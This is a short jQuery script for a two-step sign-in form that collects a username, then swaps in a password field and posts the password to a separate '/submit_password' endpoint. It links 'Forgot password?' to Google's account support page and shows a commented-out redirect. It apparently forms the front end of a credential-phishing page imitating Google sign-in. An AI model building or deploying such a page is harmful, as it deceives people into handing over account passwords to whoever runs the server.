$(document).ready(function() {
    $('form').submit(function(event) {
        event.preventDefault(); // Prevent default form submission

        // fix the name that will be displayed
        var userInput = document.getElementById('userLogin').value
        if (!userInput.includes('@')) {
            userInput += "@example.com";
        }

        if (validateInput()) {
            $.ajax({
                type: 'POST',
                url: '/submit_login',
                data: $(this).serialize(),
                success: function(response) {
                    // Change the form to request a password
                    $('form').html('<input type="password" placeholder="Enter your password" id="userPassword" name="user_password" required>' +
                        '<label for="showPassword" style="display: inline-flex; align-items: center; white-space: nowrap;"><input type="checkbox" id="showPassword" style="margin-right: 5px;">Show password</label>' +
                        '<p><a href="https://support.google.com/accounts/answer/7682439" target="_blank">Forgot password?</a></p>' +
                        '<div class="card-bottom"><button type="submit" class="move-up">Next</button></div>');
                    // Add event listener to the checkbox for showing/hiding password
                    $('#showPassword').change(function() {
                        if ($(this).is(':checked')) {
                            $('input[name="user_password"]').attr('type', 'text');
                        } else {
                            $('input[name="user_password"]').attr('type', 'password');
                        }
                    });
                    // Update headers
                    $('h2').text('Welcome');
                    $('h3').text(userInput);

                    $('form').attr('action', '/submit_password');
                    // Handle new form submission for password
                    $('form').unbind('submit').submit(function(event) {
                        var passwordData = $(this).serialize(); // Serialize new form data
                        $.post('/submit_password', passwordData, function() {
                            // window.location.href = "http://example.com";
                        });
                    });

                }
            });
        } else {

        }
    });
});
